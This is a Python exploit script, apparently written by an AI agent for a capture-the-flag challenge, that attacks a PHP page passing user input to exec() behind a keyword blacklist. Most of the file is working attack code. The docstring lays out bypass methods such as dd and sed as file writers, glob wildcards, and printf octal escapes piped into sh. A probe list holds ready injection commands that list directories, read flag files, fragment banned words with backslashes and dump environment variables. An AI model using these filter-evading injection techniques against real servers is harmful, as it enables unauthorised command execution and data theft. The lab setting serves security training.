#!/usr/bin/env python3
r"""
solve-lane-b.py -- LANE B (agent-3, task t3)
Target: http://node4.anna.nssctf.cn:27309/  (Apache/2.4.25 Debian, PHP/5.6.40, mod_php)

index.php:
    <?php highlight_file(__FILE__);
    if(isset($_GET['url'])){ $url=$_GET['url'];
      if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url)){ echo "Sorry,you can't use this."; }
      else { echo "Can you see anything?"; exec($url); } }

Blind exec: output is NOT reflected, only "Can you see anything?".
Lane-B strategy (no `>`, no `-`, no `*`, no `"`, no `$`, no `%`):
   1. writers that take an explicit output argument  -> dd / tar cf / split / uniq / sed w
   2. stdout capture without tee                    -> `<cmd> | dd of=file`
   3. sh chaining via %0A newline, %3B `;`, %7C `|`
   4. globs with `?` and `[a-z]` to avoid the banned `la` substring in "flag"
   5. universal fallback: printf with octal escapes piped into sh
      -> `printf '...\076...' | sh` builds banned bytes (>, <, $, -, *, "la", cat...) at runtime.

Usage:
  python solve-lane-b.py check '<decoded command>'       # local filter simulation
  python solve-lane-b.py run   '<decoded command>' FILE   # send, then GET /FILE
  python solve-lane-b.py raw   '<decoded command>'        # send, print response head
  python solve-lane-b.py fetch FILE                       # GET /FILE
  python solve-lane-b.py batch                            # run the angle A/B/C probe matrix
"""
import sys
import re
import time
import urllib.parse
import urllib.request
import urllib.error

BASE = "http://node4.anna.nssctf.cn:27309/"
BLOCK = re.compile(r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|\*|"|>|<|%|\$', re.I)
MARK_OK = "Can you see anything?"


def blocked(cmd: str):
    m = BLOCK.search(cmd)
    return m.group(0) if m else None


def http_get(path: str, timeout: int = 60):
    """Return (status, body_bytes). Never raises on 404."""
    url = BASE + path
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 lane-b"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def send(cmd: str, timeout: int = 120):
    bad = blocked(cmd)
    if bad is not None:
        raise SystemExit("LOCAL FILTER REJECT: %r contains banned %r" % (cmd, bad))
    q = urllib.parse.quote(cmd, safe="")
    status, body = http_get("?url=" + q, timeout=timeout)
    txt = body.decode("utf-8", "replace")
    # CAVEAT (found in lane B): highlight_file() dumps index.php inside <code>...</code>,
    # so the RAW body ALWAYS contains both "Sorry,you can't use this." and the exec marker.
    # Judge only the tail after the LAST </code>.
    tail = txt.rsplit("</code>", 1)[-1]
    tag = "OK" if MARK_OK in tail else ("BLOCKED-REMOTE" if "Sorry" in tail else "??")
    return tag, txt, BASE + "?url=" + q


def run(cmd: str, outfile: str, show=4000):
    tag, txt, url = send(cmd)
    print("[>] %s" % url)
    print("[i] decoded: %r" % cmd)
    print("[i] response: %s (%d bytes)" % (tag, len(txt)))
    if tag != "OK":
        print(txt[:300])
        return None
    time.sleep(0.5)
    st, body = http_get(outfile)
    print("[+] GET %s%s -> HTTP %s, %d bytes" % (BASE, outfile, st, len(body)))
    print("-" * 60)
    print(body.decode("utf-8", "replace")[:show])
    print("-" * 60)
    return body


PROBES = [
    # ---- VERIFIED CHAIN (see node4-27309/lane-b.md) ----
    # 1. enumerate / without `ls` (banned): `dir` + pipe into `dd of=` == tee replacement
    ("V1 dir / -> b3.txt",             "dir / | dd of=b3.txt",           "b3.txt"),
    # 2. glob proof: `?` reaches the shell
    ("V2 dir /et? -> q1.txt",          "dir /et? | dd of=q1.txt",        "q1.txt"),
    # 3. resolve the banned-`la` filename (real flag path, 19 bytes)
    ("V3 dir real flag glob -> q3.txt", "dir /f?????aaaaaa??????? | dd of=q3.txt", "q3.txt"),
    # 4. read the decoy pointer (dd if=/of= needs no `>` and no `-`)
    ("V4 read decoy -> zz1.txt",       "dd if=/a_here_is_a_f1ag of=zz1.txt", "zz1.txt"),
    # 5. read the REAL flag file through the glob-resolved path
    ("V5 read real flag -> lb_real.txt", "dd if=/f?????aaaaaa??????? of=lb_real.txt", "lb_real.txt"),
    # ---- backslash fragmentation: regex-verified offline, NOT exercised live (host was down) ----
    ("F1 frag literal flag path",      "nl /flllll\\aaaaaaggggggg | dd of=f1.txt",     "f1.txt"),
    ("F2 frag keyword + path",         "c\\at /flllll\\aaaaaaggggggg | dd of=f2.txt", "f2.txt"),
    # ---- untested at teardown (host went offline) ----
    ("A1 tar cf archive",              "tar cf b5.tar /f?????aaaaaa???????", "b5.tar"),
    ("A2 split prefixaa",              "split /f?????aaaaaa??????? b6",  "b6aa"),
    ("A3 uniq IN OUT",                 "uniq /f?????aaaaaa??????? b7.txt", "b7.txt"),
    ("A4 sed w-command",               "sed 'w b8.txt' /f?????aaaaaa???????", "b8.txt"),
    ("C1 env dump",                    "env | dd of=b10.txt",            "b10.txt"),
    ("C2 dir of /tmp",                 "dir /tmp | dd of=b11.txt",       "b11.txt"),
    ("C3 dir of /home",                "dir /home | dd of=b12.txt",      "b12.txt"),
    ("C4 dir of /var/www",             "dir /var/www | dd of=b13.txt",   "b13.txt"),
]


def batch():
    results = []
    for label, cmd, out in PROBES:
        bad = blocked(cmd)
        if bad:
            print("[skip] %-30s local-filter%r" % (label, bad))
            results.append((label, cmd, "local-block:" + bad))
            continue
        try:
            tag, txt, url = send(cmd)
        except Exception as e:
            print("[ERR ] %-30s %s" % (label, e))
            results.append((label, cmd, "err:" + str(e)))
            continue
        print("[send] %-30s %-46s -> %s" % (label, cmd, tag))
        if tag != "OK":
            results.append((label, cmd, tag))
            continue
        time.sleep(0.3)
        st, body = http_get(out)
        snippet = body[:200].decode("utf-8", "replace").replace("\n", "\\n")
        print("       GET /%s -> %s (%d bytes) %s" % (out, st, len(body), snippet[:120]))
        results.append((label, cmd, "HTTP %s %d bytes" % (st, len(body))))
    print("\n===== SUMMARY =====")
    for label, cmd, res in results:
        print("%-30s | %-46s | %s" % (label, cmd, res))


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    a = sys.argv[1]
    if a == "check":
        c = sys.argv[2]
        b = blocked(c)
        print(("REJECTED on %r" % b) if b else "PASSES filter")
    elif a == "run":
        run(sys.argv[2], sys.argv[3])
    elif a == "raw":
        tag, txt, url = send(sys.argv[2])
        print("[>] %s" % url)
        print("[i] %s" % tag)
        print(txt[:500])
    elif a == "fetch":
        st, body = http_get(sys.argv[2])
        print("HTTP %s, %d bytes" % (st, len(body)))
        sys.stdout.buffer.write(body[:8000])
    elif a == "batch":
        batch()
    else:
        print(__doc__)
        sys.exit(1)
